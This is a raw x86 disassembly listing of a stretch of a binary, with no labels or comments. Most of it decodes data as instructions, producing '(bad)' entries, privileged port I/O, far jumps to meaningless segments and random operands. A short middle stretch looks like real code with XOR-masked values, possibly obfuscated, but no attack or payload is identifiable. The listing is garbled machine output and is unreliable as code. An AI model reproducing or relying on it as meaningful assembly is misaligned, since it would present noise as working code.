  41b243:	jp     0x41b2b8
  41b245:	lds    edx,FWORD PTR [edx]
  41b247:	or     al,0xf7
  41b249:	sbb    BYTE PTR [ecx],cl
  41b24b:	js     0x41b29b
  41b24d:	cmc    
  41b24e:	sti    
  41b24f:	enter  0xfe54,0x10
  41b253:	mov    al,ds:0x5e5c769a
  41b258:	test   ah,bh
  41b25a:	xor    DWORD PTR [edx],ecx
  41b25c:	pop    esi
  41b25d:	lods   al,BYTE PTR ds:[esi]
  41b25e:	mov    ds:0xa29d4212,eax
  41b263:	sub    ch,BYTE PTR [edi-0x3e05cd92]
  41b269:	xlat   BYTE PTR ds:[ebx]
  41b26a:	imul   ecx,ebp,0x31a54227
  41b270:	pop    edx
  41b271:	loop   0x41b246
  41b273:	aam    0x94
  41b275:	test   DWORD PTR [eax+0x343a9b05],ecx
  41b27b:	data16 (bad) 
  41b27d:	mov    bh,0x3a
  41b27f:	test   al,0xeb
  41b281:	retf   0xa1bf
  41b284:	icebp  
  41b285:	mov    ah,0xec
  41b287:	and    ebx,ebx
  41b289:	mov    WORD PTR [ebx],gs
  41b28b:	popa   
  41b28c:	jp     0x41b2e2
  41b28e:	js     0x41b2b7
  41b290:	std    
  41b291:	idiv   DWORD PTR [esi+eax*1-0x452db7c3]
  41b298:	shl    BYTE PTR [ecx-0x16611c8a],1
  41b29e:	call   0x8899:0x72cfb058
  41b2a5:	xlat   BYTE PTR ds:[ebx]
  41b2a6:	push   ebp
  41b2a7:	loopne 0x41b2bb
  41b2a9:	push   0x71
  41b2ab:	dec    esp
  41b2ac:	jecxz  0x41b244
  41b2ae:	cli    
  41b2af:	test   BYTE PTR [eax],0x44
  41b2b2:	add    al,0x3d
  41b2b4:	add    dl,BYTE PTR [ebx+edi*4+0x20aacf84]
  41b2bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2bc:	mov    ebp,0xe1364e8c
  41b2c1:	inc    esi
  41b2c2:	fadd   QWORD PTR [ebx-0x4a]
  41b2c5:	and    ch,bh
  41b2c7:	or     bl,al
  41b2c9:	push   0x21639bf2
  41b2ce:	mov    esp,esp
  41b2d0:	ds dec esp
  41b2d2:	add    DWORD PTR ds:0x5ac8e777,ebx
  41b2d8:	loopne 0x41b2fd
  41b2da:	pop    ecx
  41b2db:	dec    ebp
  41b2dc:	and    eax,0xdd416638
  41b2e2:	xchg   edx,eax
  41b2e3:	push   0xffffffff
  41b2e5:	dec    ebx
  41b2e6:	into   
  41b2e7:	push   ebp
  41b2e8:	xor    al,0xbf
  41b2ea:	cdq    
  41b2eb:	push   ds
  41b2ec:	daa    
  41b2ed:	out    dx,al
  41b2ee:	div    BYTE PTR [esp+eax*2]
  41b2f1:	ss lahf 
  41b2f3:	test   eax,0xb6d93b52
  41b2f8:	pop    esp
  41b2f9:	cmp    DWORD PTR [eax],0xffffff87
  41b2fc:	outs   dx,BYTE PTR ds:[esi]
  41b2fd:	sub    al,0xb6
  41b2ff:	mov    edx,0x35aa31ef
  41b304:	or     eax,ebp
  41b306:	adc    al,0xe4
  41b308:	push   es
  41b309:	or     ch,BYTE PTR [eax]
  41b30b:	aaa    
  41b30c:	mov    WORD PTR [ebp-0x52c95dcc],ds
  41b312:	xchg   BYTE PTR [ebp-0x60],dl
  41b315:	push   ecx
  41b316:	add    eax,0x60d144d0
  41b31b:	sub    ebx,DWORD PTR [ebp-0x12]
  41b31e:	sub    eax,0x56ab8404
  41b323:	je     0x41b34c
  41b325:	retf   
  41b326:	add    bl,BYTE PTR [ebp+0x39b4b224]
  41b32c:	arpl   cx,bp
  41b32e:	out    0x96,al
  41b330:	push   ecx
  41b331:	popf   
  41b332:	hlt    
  41b333:	stos   BYTE PTR es:[edi],al
  41b334:	mov    bh,0xa7
  41b336:	loopne 0x41b334
  41b338:	and    al,0x3f
  41b33a:	int3   
  41b33b:	and    ah,BYTE PTR [edx]
  41b33d:	jmp    DWORD PTR [ecx+0x6f07a2f6]
  41b343:	popf   
  41b344:	fdiv   DWORD PTR [eax+0x543ef129]
  41b34a:	cmp    DWORD PTR [esi+0x15],eax
  41b34d:	cmp    ah,bh
  41b34f:	mov    ebx,0xfc4c1e4b
  41b354:	outs   dx,BYTE PTR ds:[esi]
  41b355:	adc    bh,BYTE PTR [ecx-0x1eee42a5]
  41b35b:	iret   
  41b35c:	pop    edx
  41b35d:	sbb    al,0x3f
  41b35f:	add    BYTE PTR [edx],ch
  41b361:	call   0x27fce3e
  41b366:	(bad)  
  41b367:	mov    ch,0x36
  41b369:	test   eax,0xc77e4bd3
  41b36e:	jnp    0x41b37d
  41b370:	dec    ecx
  41b371:	sbb    al,0xff
  41b373:	xor    DWORD PTR fs:0x2ca85bb9,0xb6a98061
  41b37e:	or     dh,cl
  41b380:	pop    ss
  41b381:	call   0xd66246cd
  41b386:	in     al,0x5b
  41b388:	fwait
  41b389:	jns    0x41b35a
  41b38b:	adc    BYTE PTR [eax-0x4274ba23],0x89
  41b392:	out    dx,eax
  41b393:	mov    ebp,0x5501b6e5
  41b398:	cmc    
  41b399:	fsubp  st(4),st
  41b39b:	mov    bh,dh
  41b39d:	mov    ch,0xb7
  41b39f:	mov    dl,0xee
  41b3a1:	push   eax
  41b3a2:	pusha  
  41b3a3:	int3   
  41b3a4:	fidiv  WORD PTR [ebx-0x43]
  41b3a7:	fild   QWORD PTR ss:0x3a2dc21c
  41b3ae:	test   ebp,ebx
  41b3b0:	sbb    al,0x5c
  41b3b2:	mov    ch,0xc4
  41b3b4:	inc    eax
  41b3b5:	and    al,0x6
  41b3b7:	sbb    ch,BYTE PTR [edi+0x5ccbb12b]
  41b3bd:	mov    bl,0x80
  41b3bf:	out    dx,eax
  41b3c0:	push   ecx
  41b3c1:	lea    esp,[esi]
  41b3c3:	fpatan 
  41b3c5:	(bad)  
  41b3c6:	fidivr DWORD PTR [edx-0x14641ba]
  41b3cc:	sub    DWORD PTR [edx],edi
  41b3ce:	dec    ebx
  41b3cf:	sahf   
  41b3d0:	in     al,dx
  41b3d1:	xchg   edx,eax
  41b3d2:	mov    ch,0xf2
  41b3d4:	cmp    ah,dh
  41b3d6:	leave  
  41b3d7:	bound  edx,QWORD PTR [esp+edx*4-0x60]
  41b3db:	mov    BYTE PTR [eax-0x47],dl
  41b3de:	je     0x41b418
  41b3e0:	les    eax,FWORD PTR [esi-0x5cc88291]
  41b3e6:	xor    al,0x54
  41b3e8:	stos   DWORD PTR es:[edi],eax
  41b3e9:	mov    ds:0xa39984d7,eax
  41b3ee:	push   eax
  41b3ef:	dec    edi
  41b3f0:	inc    ecx
  41b3f1:	mov    esi,0xf76eb623
  41b3f6:	adc    DWORD PTR cs:[edi+0x5f752e95],ebx
  41b3fd:	jmp    0xf5e1dfd3
  41b402:	inc    esp
  41b403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b404:	sti    
  41b405:	xor    DWORD PTR [edi+0x1c],esi
  41b408:	dec    esp
  41b409:	mov    al,0x6f
  41b40b:	les    esp,FWORD PTR [ecx+0xf186c30]
  41b411:	dec    ebp
  41b412:	jge    0x41b455
  41b414:	inc    esi
  41b415:	pusha  
  41b416:	xchg   esi,eax
  41b417:	call   0x45031077
  41b41c:	sub    esi,DWORD PTR [edx+0x63abb976]
  41b422:	fstp   QWORD PTR [esi-0x43]
  41b425:	pop    ds
  41b426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b427:	inc    eax
  41b428:	out    dx,al
  41b429:	out    0x4a,al
  41b42b:	(bad)  [edx-0x53]
  41b42e:	pop    esp
  41b42f:	iret   
  41b430:	adc    al,0xc7
  41b432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b433:	xchg   edi,eax
  41b434:	push   eax
  41b435:	enter  0x51a1,0x8b
  41b439:	push   ebp
  41b43a:	or     BYTE PTR [ebx-0x3d7e57a3],cl
  41b440:	cli    
  41b441:	or     BYTE PTR [edi+0x0],dl
  41b444:	imul   edx,ebx
  41b447:	mov    DWORD PTR [ebp-0x58],edx
  41b44a:	mov    edx,DWORD PTR [ebp+0x8]
  41b44d:	mov    ebx,DWORD PTR [ebp-0x54]
  41b450:	add    edx,0x64f898
  41b456:	or     edx,ebx
  41b458:	mov    DWORD PTR [ebp-0x54],edx
  41b45b:	mov    edx,DWORD PTR [ebp+0x8]
  41b45e:	mov    ebx,DWORD PTR [ebp-0x50]
  41b461:	add    edx,ecx
  41b463:	xor    edx,ebx
  41b465:	mov    DWORD PTR [ebp-0x50],edx
  41b468:	mov    edx,DWORD PTR [ebp+0x8]
  41b46b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b46e:	add    edx,edi
  41b470:	and    edx,ebx
  41b472:	mov    DWORD PTR [ebp-0x4c],edx
  41b475:	mov    edx,DWORD PTR [ebp+0x8]
  41b478:	mov    ebx,DWORD PTR [ebp-0x48]
  41b47b:	lea    edx,[ebx+edx*1+0x241fcdf]
  41b482:	mov    DWORD PTR [ebp-0x48],edx
  41b485:	mov    edx,DWORD PTR [ebp+0x8]
  41b488:	mov    ebx,0xfa5e1524
  41b48d:	sub    ebx,edx
  41b48f:	add    ebx,DWORD PTR [ebp-0x44]
  41b492:	mov    DWORD PTR [ebp-0x44],ebx
  41b495:	mov    edx,DWORD PTR [ebp+0x8]
  41b498:	xor    edx,eax
  41b49a:	add    edx,esi
  41b49c:	jne    0x4190c6
  41b4a2:	mov    edx,DWORD PTR [ebp-0x8]
  41b4a5:	mov    ebx,DWORD PTR [ebp-0xc]
  41b4a8:	xor    edx,eax
  41b4aa:	lea    edx,[edx+ebx*1+0x3272f1]
  41b4b1:	mov    DWORD PTR [ebp-0xc],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x10]
  41b4b7:	xor    edx,eax
  41b4b9:	add    edx,esi
  41b4bb:	jne    0x41465c
  41b4c1:	jmp    0x421ff5
  41b4c6:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4c9:	mov    DWORD PTR [ebp+0x8],ecx
  41b4cc:	jmp    0x41fc03
  41b4d1:	mov    ecx,DWORD PTR [ebp+0x8]
  41b4d4:	mov    edx,DWORD PTR [ebp-0x8]
  41b4d7:	xor    ecx,eax
  41b4d9:	xor    edx,eax
  41b4db:	sub    ecx,edx
  41b4dd:	sub    ecx,esi
  41b4df:	xor    ecx,eax
  41b4e1:	mov    DWORD PTR [ebp+0x8],ecx
  41b4e4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b4e7:	mov    edx,DWORD PTR [ebp-0x58]
  41b4ea:	add    ecx,0x5708fa
  41b4f0:	imul   ecx,edx
  41b4f3:	jmp    0x41d852
  41b4f8:	test   al,0x3a
  41b4fa:	jl     0x41b49e
  41b4fc:	out    dx,al
  41b4fd:	mov    ds:0xdb3d32a2,al
  41b502:	sti    
  41b503:	loopne 0x41b49d
  41b505:	js     0x41b526
  41b507:	int3   
  41b508:	in     eax,dx
  41b509:	clc    
  41b50a:	jl     0x41b48f
  41b50c:	cmp    eax,0x4883835e
  41b511:	les    esi,FWORD PTR [eax+0x1c3ab095]
  41b517:	addr16 dec edi
  41b519:	adc    esp,esp
  41b51b:	add    BYTE PTR ds:0x3281ea7a,cl
  41b521:	sbb    DWORD PTR [ecx+0x33381d7d],0xa6af334
  41b52b:	addr16 iret 
  41b52d:	(bad)  
  41b52e:	(bad)  
  41b530:	fisttp DWORD PTR [eax-0x5d2dc12]
  41b536:	popf   
  41b537:	mov    DWORD PTR [edi+eiz*2-0x49373192],ecx
  41b53e:	sti    
  41b53f:	add    bl,BYTE PTR [eax-0xb]
  41b542:	mov    ch,0xca
  41b544:	jns    0x41b4e3
  41b546:	sub    esi,DWORD PTR [eax+0x55]
  41b549:	ja     0x41b543
  41b54b:	pop    ds
  41b54c:	fcom   DWORD PTR [esp+esi*8+0x222d19e6]
  41b553:	in     eax,dx
  41b554:	sub    esp,DWORD PTR [ebp-0xad8fe2c]
  41b55a:	and    edx,ecx
  41b55c:	dec    esi
  41b55d:	jmp    0x41b5c9
  41b55f:	loopne 0x41b4f6
  41b561:	pop    edx
  41b562:	push   cs
  41b563:	add    DWORD PTR [ebx],esp
  41b565:	adc    al,0xdb
  41b567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b568:	out    0xd5,ax
  41b56b:	fist   DWORD PTR ds:0xbc50862b
  41b571:	mov    ebx,eax
  41b573:	or     BYTE PTR [ebp+ebp*1+0x1b],cl
  41b577:	icebp  
  41b578:	xlat   BYTE PTR ds:[ebx]
  41b579:	xchg   edx,eax
  41b57a:	sbb    bh,BYTE PTR [ebx-0xe87ad37]
  41b580:	retf   0x13ed
  41b583:	ds lock push edx
  41b586:	adc    DWORD PTR [edx+0xa9de5c8],0x7d
  41b58d:	or     ecx,DWORD PTR [ebx-0x1d26614a]
  41b593:	jmp    0x41b557
  41b595:	iret   
  41b596:	pop    ds
  41b597:	cwde   
  41b598:	push   cs
  41b599:	(bad)  
  41b59a:	call   0xdb8:0x2c977f94
  41b5a1:	push   0x46d3ad19
  41b5a6:	int    0xee
  41b5a8:	xchg   DWORD PTR [edx],edi
  41b5aa:	icebp  
  41b5ab:	mov    DWORD PTR [esi],esi
  41b5ad:	pop    ebx
  41b5ae:	mov    ebp,0x1db5d0b1
  41b5b3:	inc    eax
  41b5b4:	cld    
  41b5b5:	push   0xffffffb2
  41b5b7:	or     al,0xf3
  41b5b9:	sub    bl,al
  41b5bb:	pushf  
  41b5bc:	pop    es
  41b5bd:	mov    esi,0xdbe557db
  41b5c2:	aaa    
  41b5c3:	push   0xa34a7abc
  41b5c8:	cmp    bl,bh
  41b5ca:	imul   esp,DWORD PTR [esi-0x20],0xffffffe9
  41b5ce:	or     dl,BYTE PTR [ebx-0x25]
  41b5d1:	add    DWORD PTR [edx-0x46],0xffffff9c
  41b5d5:	fisub  WORD PTR [eax+0x292a811b]
  41b5db:	adc    al,0x3b
  41b5dd:	aad    0x39
  41b5df:	and    ah,BYTE PTR [ecx+0x7d]
  41b5e2:	inc    ecx
  41b5e3:	sub    eax,0x691e9cdd
  41b5e8:	popa   
  41b5e9:	xchg   DWORD PTR [edx+0x2e],edx
  41b5ec:	mov    ebp,0x6de9b30f
  41b5f1:	int    0x7b
  41b5f3:	sbb    BYTE PTR [ebx],bh
  41b5f5:	jmp    0x6b3a:0xb6085f90
  41b5fc:	pop    esp
  41b5fd:	div    DWORD PTR [ebp-0x14]
  41b600:	jg     0x41b65d
  41b602:	add    BYTE PTR [ebx-0x289745fc],cl
  41b608:	out    0xc6,al
  41b60a:	fdivr  DWORD PTR [esi-0x694a6483]
  41b610:	jmp    0x32f5:0x8fcc1a5a
  41b617:	jge    0x41b668
  41b619:	rol    BYTE PTR [ebx+eax*8+0x5e54db58],0x82
  41b621:	add    BYTE PTR [edx+0x73d6f138],0xf9
  41b628:	aam    0x79
  41b62a:	(bad)  
  41b62b:	outs   dx,BYTE PTR ds:[esi]
  41b62c:	pop    ss
  41b62d:	repnz call 0xb0db:0x4520c44e
  41b635:	inc    ecx
  41b636:	inc    ebx
  41b637:	arpl   WORD PTR [esi-0x54],di
  41b63a:	std    
  41b63b:	in     al,0x9
  41b63d:	cld    
  41b63e:	retf   0x247f
  41b641:	addr16 push eax
  41b643:	mov    edx,ebx
  41b645:	(bad)  
  41b647:	adc    ecx,DWORD PTR [esi]
  41b649:	sub    DWORD PTR [ecx+0x4bec3cce],0x56
  41b650:	pop    ss
  41b651:	cmp    BYTE PTR [ebp+0x3d],dh
  41b654:	das    
  41b655:	int3   
  41b656:	xor    esp,DWORD PTR [ecx+0x14f95ecb]
  41b65c:	adc    DWORD PTR [ebp-0x4],0xfffffff8
  41b660:	cwde   
  41b661:	and    ebp,DWORD PTR [ebp+0x1b41a067]
  41b667:	outs   dx,DWORD PTR ds:[esi]
  41b668:	nop
  41b669:	es sti 
  41b66b:	popa   
  41b66c:	xor    DWORD PTR [bx+si],edx
  41b66f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b670:	test   ecx,edx
  41b672:	and    al,0x2b
  41b674:	sbb    ah,BYTE PTR [esi+0x27]
  41b677:	or     eax,0xf89d3302
  41b67c:	add    cl,al
  41b67e:	mov    esp,DWORD PTR [eax]
  41b680:	add    bh,bl
  41b682:	adc    esp,DWORD PTR [esi]
  41b684:	pop    edi
  41b685:	cmp    al,BYTE PTR [ebp+edx*1+0x2e]
  41b689:	pop    esp
  41b68a:	sbb    dl,BYTE PTR [edx]
  41b68c:	push   cs
  41b68d:	sub    BYTE PTR [edi-0x1ad020bc],ah
  41b693:	out    dx,eax
  41b694:	cmc    
  41b695:	iret   
  41b696:	cmp    al,0x12
  41b698:	cmp    al,BYTE PTR [ebx+esi*1-0x50]
  41b69c:	xchg   ebp,eax
  41b69d:	shr    BYTE PTR [eax+ebp*8-0x515a164e],1
  41b6a4:	jbe    0x41b710
  41b6a6:	push   esi
  41b6a7:	daa    
  41b6a8:	push   0x6e
  41b6aa:	retf   0xf20a
  41b6ad:	jns    0x41b65d
  41b6af:	xor    DWORD PTR [ecx-0x682c55e2],0x2f820eff
  41b6b9:	pop    ds
  41b6ba:	je     0x41b672
  41b6bc:	das    
  41b6bd:	push   0x6d
  41b6bf:	std    
  41b6c0:	sbb    DWORD PTR [ebx-0x20c06420],0x42
  41b6c7:	in     eax,0xe6
  41b6c9:	loop   0x41b744
  41b6cb:	leave  
  41b6cc:	(bad)  
  41b6cd:	fidivr WORD PTR [ebp-0x19]
  41b6d0:	push   ecx
  41b6d1:	pop    edi
  41b6d2:	cmp    bl,dl
  41b6d4:	add    ebp,eax
  41b6d6:	cwde   
  41b6d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6d8:	pop    edi
  41b6d9:	adc    ecx,DWORD PTR [esi+0x5cc5ef0]
  41b6df:	out    0x97,al
  41b6e1:	faddp  st(1),st
  41b6e3:	xchg   edi,eax
  41b6e4:	out    0x9,al
  41b6e6:	pop    ebp
  41b6e7:	fmulp  st(1),st
  41b6e9:	push   ecx
  41b6ea:	fs jle 0x41b70e
  41b6ed:	jns    0x41b683
  41b6ef:	xlat   BYTE PTR ds:[ebx]
  41b6f0:	push   edx
  41b6f1:	adc    DWORD PTR [ecx+edx*2+0x5c028ec3],ebx
  41b6f8:	inc    edi
  41b6f9:	xor    BYTE PTR gs:[esi],ch
  41b6fc:	pop    ds
  41b6fd:	pop    esi
  41b6fe:	inc    esi
  41b6ff:	in     eax,dx
  41b700:	pop    eax
  41b701:	test   al,0x3d
  41b703:	fst    DWORD PTR [ecx+ebp*2-0x6dd179fe]
  41b70a:	nop
  41b70b:	jmp    0xa991dcd0
  41b710:	dec    ebx
  41b711:	out    dx,eax
  41b712:	push   eax
  41b713:	or     DWORD PTR [ebx+ebx*4-0x62],edx
  41b717:	add    DWORD PTR [edi+0x42],ecx
  41b71a:	ja     0x41b776
  41b71c:	jl     0x41b74b
  41b71e:	xchg   BYTE PTR [ebx-0x2a],dh
  41b721:	fisub  WORD PTR [edx-0x74dbbb0b]
  41b727:	ja     0x41b6c4
  41b729:	cmovae edi,DWORD PTR [ecx-0x74486b3c]
  41b730:	inc    esi
  41b731:	out    0x49,al
  41b733:	aam    0x61
  41b735:	inc    esp
  41b736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b737:	xchg   edx,eax
  41b738:	adc    DWORD PTR [edi+0x1e283814],ebp
  41b73e:	pop    eax
  41b73f:	arpl   WORD PTR [edx-0x2a],bx
  41b742:	push   edx
  41b743:	ss xchg ebp,eax
  41b745:	(bad)  
  41b746:	jbe    0x41b6f5
  41b748:	jbe    0x41b6de
  41b74a:	aas    
  41b74b:	push   ebx
  41b74c:	pop    ecx
  41b74e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b74f:	js     0x41b6fd
  41b751:	jl     0x41b7bf
  41b753:	loope  0x41b70e
  41b755:	pop    ebx
  41b756:	fs rcl al,1
  41b759:	push   ss
  41b75a:	and    edx,DWORD PTR [eax-0x632517eb]
  41b760:	aas    
  41b761:	sbb    BYTE PTR [ebx-0x5f6b39fa],al
  41b767:	(bad)  
  41b768:	scas   eax,DWORD PTR es:[edi]
  41b769:	aaa    
  41b76a:	xor    BYTE PTR [edx],0x19
  41b76d:	push   es
  41b76e:	fisttp QWORD PTR [eax+0x1a817df6]
  41b774:	ror    DWORD PTR [edi],1
  41b776:	or     DWORD PTR [edx],0xffffffa4
  41b779:	mov    al,ds:0x33f446e8
  41b77e:	xor    ebx,ebp
  41b780:	adc    bh,cl
  41b782:	push   eax
  41b783:	adc    bl,dl
  41b785:	adc    DWORD PTR [ebp-0x75],edx
  41b788:	or     bl,BYTE PTR [ebp-0x31]
  41b78b:	and    al,0xa8
  41b78d:	addr16 cwde 
  41b78f:	rcr    DWORD PTR [ebp-0x7f],0x22
  41b793:	jg     0x41b7e4
  41b795:	jb     0x41b71a
  41b797:	add    ebx,esp
  41b799:	sbb    eax,0x8fdf4689
  41b79e:	push   esi
  41b79f:	inc    ecx
  41b7a0:	add    eax,0xbdc68fe
  41b7a5:	imul   BYTE PTR [edi]
  41b7a7:	or     al,0x17
  41b7a9:	daa    
  41b7aa:	or     al,0x83
  41b7ac:	(bad)  
  41b7ad:	leave  
  41b7ae:	lods   al,BYTE PTR ds:[esi]
  41b7af:	iret   
  41b7b0:	mov    dl,0x80
  41b7b2:	sbb    cl,BYTE PTR [eax]
  41b7b4:	sbb    al,0x4e
  41b7b6:	test   eax,0xbf2541ac
  41b7bb:	mov    eax,ds:0xbe39d1f3
  41b7c0:	arpl   WORD PTR [ebx-0x53b3db52],sp
  41b7c6:	pop    eax
  41b7c7:	stos   DWORD PTR es:[edi],eax
  41b7c8:	(bad)  
  41b7ca:	sub    DWORD PTR [edx],esp
  41b7cc:	or     eax,0x6f31304d
  41b7d1:	fs mov ebp,0xec29d841
  41b7d7:	pop    eax
  41b7d8:	mov    ds:0x45d92687,eax
  41b7dd:	in     al,dx
  41b7de:	call   0xd489:0x12b6eaf2
  41b7e5:	call   DWORD PTR [ebp+0x580b9da8]
  41b7eb:	add    al,0xa7
  41b7ed:	pop    ss
  41b7ee:	ret    0x9bc2
  41b7f1:	mov    ch,0x16
  41b7f3:	jg     0x41b835
  41b7f5:	(bad)  
  41b7f6:	xor    ebp,DWORD PTR [ecx-0x27]
  41b7f9:	fs or  eax,0xe775ae02
  41b7ff:	xchg   edi,eax
  41b800:	xchg   esp,eax
  41b801:	or     esi,DWORD PTR [ebx+0x1b7de33e]
  41b807:	pop    ecx
  41b808:	xor    esi,DWORD PTR [ebx+ebx*4+0x4cb3b584]
  41b80f:	das    
  41b810:	xor    eax,0x9386cdfb
  41b815:	add    al,0xcc
  41b817:	jne    0x41b7bd
  41b819:	ins    DWORD PTR es:[edi],dx
  41b81a:	cli    
  41b81b:	mov    cl,0x29
  41b81d:	pushf  
  41b81e:	rcr    DWORD PTR [ebp+0x1db8a3ac],0x8c
  41b825:	inc    ecx
  41b826:	in     al,0xd9
  41b828:	jmp    0xccc7:0x561e3c19
  41b82f:	pop    esp
  41b830:	push   ebp
  41b831:	repz dec ebx
  41b833:	add    eax,0x201d7383
  41b838:	mov    bl,0x51
  41b83a:	out    dx,al
  41b83b:	jmp    0x41b86c
  41b83d:	dec    ebp
  41b83e:	pop    edi
  41b83f:	std    
  41b840:	mov    bl,0x86
  41b842:	cmp    BYTE PTR ds:0xb6d7b172,0xde
  41b849:	pop    ebx
  41b84a:	jb     0x41b816
  41b84c:	add    edx,edi
  41b84e:	(bad)  
  41b84f:	test   DWORD PTR [edx],0xebc2a94f
  41b855:	inc    ebp
  41b856:	fiadd  DWORD PTR ds:0xbdcf6d2e
  41b85c:	mov    ?,WORD PTR [ebx-0x32]
  41b85f:	andps  xmm5,XMMWORD PTR [eax-0x3e]
  41b863:	ds aaa 
  41b865:	mov    ebp,DWORD PTR [edx-0x4e]
  41b868:	pop    edi
  41b869:	inc    ecx
  41b86a:	dec    ecx
  41b86b:	test   BYTE PTR [edx],cl
  41b86d:	push   ds
  41b86e:	mov    ds:0xae970cdf,al
  41b873:	ret    0x9b7a
  41b876:	jmp    0x900970f5
  41b87b:	jae    0x41b82a
  41b87d:	(bad)  
  41b87e:	aas    
  41b87f:	mov    eax,0x656bc2ba
  41b884:	xor    al,0x98
  41b886:	mov    eax,ds:0x1d7fbf6a
  41b88b:	or     DWORD PTR ds:0x11386beb,edx
  41b891:	mov    ebp,0xc45743ed
  41b896:	stc    
  41b897:	imul   ebp,DWORD PTR [ebx+0x59],0x1b
  41b89b:	push   es
  41b89c:	xor    al,0x3a
  41b89e:	shr    DWORD PTR [ebx+0x6087d54c],1
  41b8a4:	mov    dl,0xae
  41b8a6:	pop    DWORD PTR [esi+0x6d]
  41b8a9:	(bad)
  41b8ad:	mov    eax,ds:0xdf4d338e
  41b8b2:	(bad)  
  41b8b3:	fstp   DWORD PTR ss:[ebp-0x2f5b7e00]
  41b8ba:	les    esp,FWORD PTR [edx+0x1e]
  41b8bd:	sbb    ecx,DWORD PTR cs:[eax+0x79ae1dda]
  41b8c4:	or     esi,ebp
  41b8c6:	jo     0x41b921
  41b8c8:	out    0x40,eax
  41b8ca:	xor    BYTE PTR [ebx+0x3b],dl
  41b8cd:	sbb    ebp,esp
  41b8cf:	pop    eax
  41b8d0:	jmp    0xf651d4f
  41b8d5:	add    ecx,ecx
  41b8d7:	and    BYTE PTR [ebp-0x4c057848],bh
  41b8dd:	addr16 fs ret 0x3050
  41b8e2:	aad    0x46
  41b8e4:	push   esi
  41b8e5:	inc    esi
  41b8e6:	cmp    esi,esp
  41b8e8:	retf   
  41b8e9:	das    
  41b8ea:	pop    ds
  41b8eb:	fld    TBYTE PTR [ebp+eax*1-0x1d]
  41b8ef:	mov    eax,ds:0x722ab198
  41b8f4:	push   0xe0bff358
  41b8f9:	mov    eax,ds:0x7432cfba
  41b8fe:	sub    eax,0xf319e289
  41b903:	ins    DWORD PTR es:[edi],dx
  41b904:	lea    eax,[edx-0x863a70]
  41b90a:	xchg   edi,eax
  41b90b:	mov    al,ds:0x60ceafa5
  41b910:	sbb    DWORD PTR [ebp-0x9907b0d],ebx
  41b916:	in     eax,0x22
  41b918:	in     al,0x6c
  41b91a:	lock mov ebx,DWORD PTR [ebp+edi*1-0x6935dcdf]
  41b922:	xchg   esp,eax
  41b923:	add    al,0x3
  41b925:	icebp  
  41b926:	sbb    DWORD PTR [ebx],eax
  41b928:	cdq    
  41b929:	inc    ebx
  41b92a:	fcom   st(5)
  41b92c:	out    dx,eax
  41b92d:	xor    al,0x38
  41b92f:	fstp   DWORD PTR [esi]
  41b931:	push   ebx
  41b932:	mov    dl,0x7
  41b934:	outs   dx,BYTE PTR ds:[esi]
  41b935:	pop    ebp
  41b936:	iret   
  41b937:	jne    0x41b915
  41b939:	and    dh,BYTE PTR [ecx-0x44334830]
  41b93f:	and    al,0x30
  41b941:	in     eax,dx
  41b942:	mov    dl,0x1d
  41b944:	add    esp,DWORD PTR [esi]
  41b946:	mov    ds:0x525b3aa1,al
  41b94b:	xchg   esi,eax
  41b94c:	cmc    
  41b94d:	(bad)  
  41b94e:	mov    dl,0x24
  41b950:	push   esp
  41b951:	xor    DWORD PTR [eax-0x17],edi
  41b954:	adc    BYTE PTR [ebp-0x52a8e2a1],bl
  41b95a:	push   es
  41b95b:	cli    
  41b95c:	and    al,BYTE PTR [ebp-0x4d]
  41b95f:	and    al,ah
  41b961:	pop    ebx
  41b962:	pop    ss
  41b963:	sub    al,0xa6
  41b965:	outs   dx,BYTE PTR ds:[esi]
  41b966:	cmp    edx,DWORD PTR [ebp+0x6]
  41b969:	lods   al,BYTE PTR ds:[esi]
  41b96a:	sub    BYTE PTR [edi],0xc0
  41b96d:	mov    edx,0x981c5b69
  41b972:	mov    al,0x13
  41b974:	out    0x45,eax
  41b976:	adc    bh,BYTE PTR [esi]
  41b978:	or     dh,bl
  41b97a:	sub    DWORD PTR [edx+eiz*8-0x7f574ffc],ebx
  41b981:	xchg   edx,eax
  41b982:	jmp    0x41b9e6
  41b984:	adc    al,0x64
  41b986:	test   BYTE PTR [ecx],ch
  41b988:	scas   eax,DWORD PTR es:[edi]
  41b989:	cmp    BYTE PTR [eax],bl
  41b98b:	data16 stos BYTE PTR es:[edi],al
  41b98d:	sub    eax,0x43b5710a
  41b992:	jne    0x41b9d7
  41b994:	rcr    BYTE PTR [eax],1
  41b996:	ss adc bl,dh
  41b999:	std    
  41b99a:	sbb    DWORD PTR [ecx],esi
  41b99c:	xor    ah,BYTE PTR [ecx]
  41b99e:	sub    al,0x87
  41b9a0:	jp     0x41b9fd
  41b9a2:	fldcw  WORD PTR [edi]
  41b9a4:	enter  0xf699,0xd7
  41b9a8:	sub    eax,0x51853cfe
  41b9ad:	mov    ds:0xca7183d4,eax
  41b9b2:	imul   edx,DWORD PTR [edi+ebp*8-0x496196d2],0x59
  41b9ba:	xlat   BYTE PTR ds:[ebx]
  41b9bb:	mov    eax,0xe52d59bc
  41b9c0:	inc    esp
  41b9c1:	mov    al,ds:0x588a2cf7
  41b9c6:	mov    ch,0x73
  41b9c8:	xchg   BYTE PTR [ebp-0x6f],bl
  41b9cb:	xor    dh,bh
  41b9cd:	cmp    BYTE PTR [edx],ah
  41b9cf:	and    DWORD PTR [esi-0x67],ecx
  41b9d2:	ror    DWORD PTR [ebx+0x6f],0x81
  41b9d6:	js     0x41b9a1
  41b9d8:	or     cl,bh
  41b9da:	jbe    0x41b98f
  41b9dc:	bound  ecx,QWORD PTR [ebx-0x2a]
  41b9df:	aaa    
  41b9e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9e1:	rcl    BYTE PTR [eax+0x47],1
